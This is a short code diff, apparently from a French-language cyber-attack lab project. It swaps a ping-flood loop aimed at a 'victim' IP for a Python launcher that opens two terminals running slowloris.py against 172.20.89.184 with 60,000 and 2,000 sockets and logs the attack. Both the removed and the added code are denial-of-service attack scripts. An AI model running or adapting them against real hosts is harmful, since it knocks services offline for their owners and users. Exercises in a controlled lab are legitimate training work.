@@ -1,12 +1,27 @@
+import subprocess
+import datetime
 import os
-import time
 
-target = "172.20.89.184"  # IP de la victime
+log_dir = os.path.expanduser("~/ihm_cydops/attaque/logs")
+os.makedirs(log_dir, exist_ok=True)
 
-print(f"[+] Envoi de ping en boucle vers {target}")
-try:
-    while True:
-        os.system(f"ping -c 1 {target}")
-        time.sleep(0.1)
-except KeyboardInterrupt:
-    print("\n[!] Attaque arrêtée manuellement.")
+timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+log_file = os.path.join(log_dir, f"ddos_slowloris_{timestamp}.txt")
+target = "172.20.89.184"
+
+with open(log_file, "w") as f:
+    f.write("Début de l'attaque Slowloris\n")
+    f.write(f"Date : {datetime.datetime.now()}\n")
+    f.write(f"Cible : {target}\n\n")
+
+    cmd1 = f"python3 slowloris.py -s 60000 {target}"
+    cmd2 = f"python3 slowloris.py -s 2000 {target}"
+
+    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd1])
+    f.write(f"[✔] Commande 1 lancée : {cmd1}\n")
+
+    subprocess.Popen(["xfce4-terminal", "--hold", "--command", cmd2])
+    f.write(f"[✔] Commande 2 lancée : {cmd2}\n")
+
+    f.write("\n[+] Les deux terminaux ont été lancés.\n")
+
